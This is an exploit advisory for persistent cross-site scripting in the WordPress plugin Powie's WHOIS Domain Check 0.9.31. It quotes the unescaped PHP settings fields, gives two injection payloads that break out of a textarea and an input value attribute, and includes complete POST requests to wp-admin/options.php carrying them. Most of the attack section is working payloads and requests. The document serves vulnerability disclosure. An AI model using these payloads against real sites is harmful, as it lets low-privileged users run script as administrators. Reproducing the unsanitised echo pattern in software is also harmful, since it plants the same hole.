@@ -1,0 +1,127 @@
+# Exploit Title: Wordpress Plugin Powie's WHOIS Domain Check 0.9.31 - Persistent Cross-Site Scripting
+# Date: 2020-07-07
+# Vendor Homepage: https://powie.de
+# Vendor Changelog: https://wordpress.org/plugins/powies-whois/#developers
+# Software Link: https://wordpress.org/plugins/powies-whois/
+# Exploit Author: mqt
+# Author Homepage: https://blog.haao.sh
+
+
+1. Description
+
+Powie's WHOIS Wordpress plugin was found to be vulnerable to Stored XSS as
+multiple fields in the plugin's setup settings fail to properly sanitize
+user input. The risk here is mitigated due to the fact that active
+exploitation would require authentication. However a lower privileged
+Wordpress user would be able to take advantage of the fact that the
+arbitrary Javascript executes on the same origin and therefore by using a
+specially crafted payload, an attacker would be able to elevate their
+privileges or take any of the same actions an admin would be able to.
+
+All Wordpress websites using Powie's WHOIS version < 0.9.31 are vulnerable.
+
+2. Vulnerability
+
+There are two sets of vulnerable fields with each requiring a different
+payload in order exploit.
+
+The first set of vulnerable fields display output using the `<textarea>`
+element.
+
+Show on available domains (display-on-free)
+Show on unavailable domains (display-on-connect)
+Show on invalid domain (display-on-valid)
+
+As no sanitization is being performed, an attacker can use a closing
+`</textarea>` tag to close the HTML element and thus is able to inject
+arbitrary Javascript.
+
+
+Vulnerable Code: (/plugins/powies-whois/pwhois_settings.php)
+
+<tr valign="top">
+    <th scope="row"><?php _e('Show on available domains', 'powies-whois')
+?></th>
+    <td><textarea rows="3" name="display-on-free" style="width:100%;"><?php
+echo get_option('display-on-free'); ?></textarea></td>
+</tr>
+<tr valign="top">
+    <th scope="row"><?php _e('Show on unavailable domains', 'powies-whois')
+?></th>
+    td><textarea rows="3" name="display-on-connect"
+style="width:100%;"><?php echo get_option('display-on-connect');
+?></textarea></td>
+    </tr>
+<tr valign="top">
+    <th scope="row"><?php _e('Show on invalid domain', 'powies-whois')
+?></th>
+    <td><textarea rows="3" name="display-on-invalid"
+style="width:100%;"><?php echo get_option('display-on-invalid');
+?></textarea></td>
+</tr>
+
+Payload: </textarea><img src=/ onerror=alert(1)>
+
+Vulnerable HTTP Request:
+
+POST /wp-admin/options.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0)
+Gecko/20100101 Firefox/78.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://localhost/wp-admin/options-general.php?page=powies-whois%2Fpwhois_settings.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 479
+Origin: http://localhost
+Connection: close
+Cookie: <snipped for brevity>
+Upgrade-Insecure-Requests: 1
+
+option_page=pwhois-settings&action=update&_wpnonce=e632f68003&_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Dpowies-whois%252Fpwhois_settings.php%26settings-updated%3Dtrue&show-whois-output=1&display-on-free=%3C%2Ftextarea%3E%3Cimg+src%3D%2F+onerror%3Dalert%281%29%3E&display-on-connect=%3C%2Ftextarea%3E%3Cimg+src%3D%2F+onerror%3Dalert%282%29%3E&display-on-invalid=%3C%2Ftextarea%3E%3Cimg+src%3D%2F+onerror%3Dalert%283%29%3E&before-whois-output=&after-whois-output=
+
+
+The second set of vulnerable fields display output using the <input>
+element, specifically in the value attribute. As no sanitization is
+performed, an attacker is able to use specially crafted input to escape the
+value attribute and thus have the ability to inject arbitrary Javascript.
+
+Vulnerable Code: (/plugins/powies-whois/pwhois_settings.php)
+
+<tr valign="top">
+     <th scope="row"><?php _e('HTML before whois output', 'powies-whois')
+?></th>
+     <td><input type="text" name="before-whois-output" value="<?php echo
+get_option('before-whois-output'); ?>" style="width:100%;" /></td>
+</tr>
+<tr valign="top">
+     <th scope="row"><?php _e('HTML after whois output', 'powies-whois')
+?></th>
+     <td><input type="text" name="after-whois-output" value="<?php echo
+get_option('after-whois-output'); ?>" style="width:100%;"/></td>
+</tr>
+
+Payload: "><img src=/ onerror=alert(1)>
+
+Vulnerable HTTP Request:
+POST /wp-admin/options.php HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:78.0)
+Gecko/20100101 Firefox/78.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer:
+http://localhost/wp-admin/options-general.php?page=powies-whois%2Fpwhois_settings.php
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 398
+Origin: http://localhost
+Connection: close
+Cookie: <snipped for brevity>
+Upgrade-Insecure-Requests: 1
+
+option_page=pwhois-settings&action=update&_wpnonce=e632f68003&_wp_http_referer=%2Fwp-admin%2Foptions-general.php%3Fpage%3Dpowies-whois%252Fpwhois_settings.php%26settings-updated%3Dtrue&show-whois-output=1&display-on-free=&display-on-connect=&display-on-invalid=&before-whois-output=%22%3E%3Cimg+src%3D%2F+onerror%3Dalert%281%29%3E&after-whois-output=%22%3E%3Cimg+src%3D%2F+onerror%3Dalert%282%29%3E
